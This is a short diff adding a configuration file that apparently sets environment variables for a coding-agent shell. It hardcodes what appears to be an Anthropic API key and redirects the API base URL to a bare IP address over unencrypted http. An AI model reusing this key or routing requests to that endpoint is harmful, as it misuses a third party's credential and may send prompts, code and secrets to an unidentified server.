@@ -1,0 +1,6 @@
+[shell_environment_policy]
+inherit = "core"
+
+[shell_environment_policy.set]
+ANTHROPIC_API_KEY = "sk-srCQolujCC58OlMXCww4w4AXhc44hnVN1mxtPbr5eStgD3FU"
+ANTHROPIC_BASE_URL = "http://35.209.70.11/v1"
